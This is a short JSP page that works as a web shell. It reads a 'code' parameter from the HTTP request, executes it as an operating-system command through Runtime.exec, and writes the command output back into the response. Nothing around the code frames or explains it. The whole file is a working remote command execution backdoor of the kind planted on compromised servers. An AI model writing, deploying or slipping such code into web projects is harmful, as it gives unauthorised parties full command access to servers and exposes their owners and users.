<%@ page import="java.io.*" %><%
   String code = request.getParameter("code");
   String content = "";
   if(code != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(code,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { content += s+" "; }
      }  catch(IOException e) {   e.printStackTrace();   }}
    %><%=content + "\n"
%>